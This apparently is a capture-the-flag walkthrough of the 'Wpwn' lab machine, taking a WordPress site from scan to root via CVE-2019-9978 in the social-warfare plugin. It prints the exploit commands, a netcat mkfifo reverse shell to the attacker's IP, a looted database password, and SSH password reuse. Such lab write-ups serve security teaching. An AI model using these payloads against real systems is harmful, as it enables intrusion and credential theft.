# Wpwn

## Nmap

```
sudo nmap   192.168.178.123 -p- -sS -sV          

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Running `curl` on port 80 simply shows a basic greeting for the machine by the creator.

![](<../../../.gitbook/assets/image (1587) (1).png>)

With nothing else interesting we move onto directory enumeration with `dirsearch.py`.

```
sudo python3 dirsearch.py -u http://192.168.178.123/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --full-url -t 75
```

![](<../../../.gitbook/assets/image (1588).png>)

With the common.txt wordlists we hit robots.txt and /wordpress. Robots contains no interesting information.

Moving over to the /wordpress directory we get the following page.

![/wordpress](<../../../.gitbook/assets/image (1589).png>)

Other than this the Wordpress site contains no interesting information. From here we can run `WPScan` in order to try and identify further information.

```
wpscan --url http://192.168.178.123/wordpress/ --passwords /usr/share/wordlists/rockyou.txt   
```

`WPScan` picks up the plugin 'social-warfare' as being installed and out of date.

![](<../../../.gitbook/assets/image (1590).png>)

Checking this against `searchsploit` reveals a RCE against the running version.

```
searchsploit -w social warfare 3.5.2
```

![](<../../../.gitbook/assets/image (1591).png>)

The vulnerability has been assigned CVE-2019-9978.

Description:

The social-warfare plugin before 3.5.3 for WordPress has stored XSS via the wp-admin/admin-post.php?swp\_debug=load\_options swp\_url parameter, as exploited in the wild in March 2019. This affects Social Warfare and Social Warfare Pro.

The following GitHub shows a PoC for this exploit.

{% embed url="https://github.com/hash3liZer/CVE-2019-9978" %}

As per the GitHub description we need to create a text file that will be hosted on our attacking machine with the contents of what we want to execute.

```
<pre>system('command')</pre>
```

First I hosted a `Python SimpleHTTPServer` on my attacking machine.

```
sudo python2 -m SimpleHTTPServer 443
```

I then downloaded the associated Python script and executed as per below.

```
python2 cve-2019-9978.py  --target http://192.168.178.123/wordpress/ --payload-uri http://192.168.49.178:443/test.txt
```

![](<../../../.gitbook/assets/image (1592).png>)

In the example above the command included for test.txt was `'id'`. From here I replaced the command with `'which nc'` to see if `netcat` is on the target machine and then run the exploit again.

![](<../../../.gitbook/assets/image (1593).png>)

As `netcat` is installed we can replace the command in the test.txt file with that of a `netcat` reverse shell.

Contents of test.txt:

```
<pre>system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.49.178 80 >/tmp/f')</pre>
```

I then set a `netcat` listener on my attacking machine:

```
sudo nc -lvp 80
```

Running the exploit again hangs the script as we receive a reverse shell.

![](<../../../.gitbook/assets/image (1594).png>)

![](<../../../.gitbook/assets/image (1595).png>)

We then upgrade the shell:

```
/usr/bin/script -qc /bin/bash /dev/null
```

Moving back one directory in the shell we can then read the contents of wp-config for any `MySQL` database credentials.

![](<../../../.gitbook/assets/image (1596).png>)

We have gathered the credentials: `wp_user:R3&]vzhHmMn9,:-5` From here I logged into `MySQL` and took the Wordpress administrator's hash. I was however, unable to crack. Looking on the box we have the user 'takis' I decided to see if password reuse was in play and `SSH` in as takis.

```
ssh takis@192.168.178.123
```

![](<../../../.gitbook/assets/image (1597).png>)

Now we are in as takis I then run `sudo -l` to check `sudo` permissions.

![](<../../../.gitbook/assets/image (1598).png>)

Looks like we can run all commands as any users without a password. A simple `sudo /bin/bash` will spawn us a root shell.

![](<../../../.gitbook/assets/image (1599).png>)
